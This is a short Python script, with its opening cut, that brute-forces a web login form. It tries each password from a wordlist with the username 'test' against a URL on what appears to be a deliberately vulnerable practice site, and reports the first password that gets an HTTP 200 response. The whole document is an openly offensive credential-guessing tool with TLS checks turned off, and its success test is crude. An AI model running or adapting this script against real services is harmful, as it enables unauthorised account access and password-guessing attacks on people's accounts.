mport requests

url = "http://testphp.vulnweb.com/userinfo.php"


username = "test"
wordlist_file = "passwords.txt"


def try_login(password):
    data = {
        "uname": username,
        "pass": password
    }


    response = requests.post(
        url, data=data, verify=False, allow_redirects=False)

    if 200 == response.status_code:
        print(f"[+] Login successful with password: {password}")
        return True
    else:
        print(f"[-] Failed login with password: {password}")
        return False


with open(wordlist_file, "r") as wordlist:
    for password in wordlist:
        password = password.strip()
        if try_login(password):
            break
